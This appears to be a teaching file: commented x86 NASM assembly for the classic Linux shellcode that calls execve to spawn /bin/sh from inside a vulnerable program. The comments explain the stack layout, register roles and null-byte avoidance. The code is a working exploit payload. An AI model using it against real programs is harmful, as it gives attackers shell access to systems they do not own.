; A classical Shell-spawning Shellcode. 

; This classical Shellcode uses the execve() system call to
; open Linux's basic shell /bin/sh from within a vulnerable
; program. 

; There are quite a few nieche aspects to this particular
; Shellcode which one should come to know.

; Firstly, the strings passed to execve() are writen to the
; stack in reverse order because of endianness.

; Secondly, every time an item is pushed to the stack, the
; ESP register is decremented by the size of said item.

; As such, after pushing a string, the ESP will contain a
; pointer to it.

; The arguments given to execve() are required to be placed 
; in specfic registers as shown below.

; execve(char *path, char *argv[], char *env[])

; The EBX is *path and holds the address of a path string.

; The ECX is *argv[] and holds the address of the argument
; array. Where item 0 also contains the path string. 

; The EDX is *env[] and holds the address of a list of 
; environment variables.

; When dealing with lists and strings, a good technique is
; to push data onto the stack then copy the ESP into other 
; registers.

; Null bytes almost always cause issues for Shellcode so
; sometimes its necessary to use lower register sections.

; Taking these various small details into account, the code
; below should make some sense.



section .text
    global _start

; Entry point for processor to begin execution.

_start:
    xor eax, eax

; push /bin//sh onto the stack, the path to our shell.

    push eax
    push long 0x68732f2f
    push long 0x6e69622f

; char *path.

    mov ebx, esp

; char *env[]. We're not going to give the shell any real
; environment variables, so this will just be empty.

    push eax
    mov edx, esp

; char *argv[]. We're not going to give /bin/sh any more
; arguments than simply its path (currently in the EBX). 

    push ebx
    mov ecx, esp

; Finally, with all arguments and pointers in place, we
; can envoke the system call.

    mov al, 11
    int 0x80 
